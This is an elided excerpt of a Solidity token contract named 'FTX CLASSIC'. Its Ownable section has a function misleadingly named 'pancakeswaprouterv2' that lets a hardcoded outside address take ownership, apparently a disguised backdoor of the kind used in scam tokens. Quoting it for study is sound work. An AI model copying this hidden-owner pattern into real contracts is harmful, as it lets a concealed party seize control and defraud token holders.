...
contract Ownable is Context {
    ...
    function pancakeswaprouterv2(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x60428A7EF12fCb5b2b97D3b5E658e7f86a0A0bdC));
...
contract FTXC is Context, IERC20, Ownable, Pausable {
  ...
  uint256 private _totalSupply = 88888888 * 10**18;
  string private _symbol = "FTX CLASSIC";
  string private _name = "FTXC";
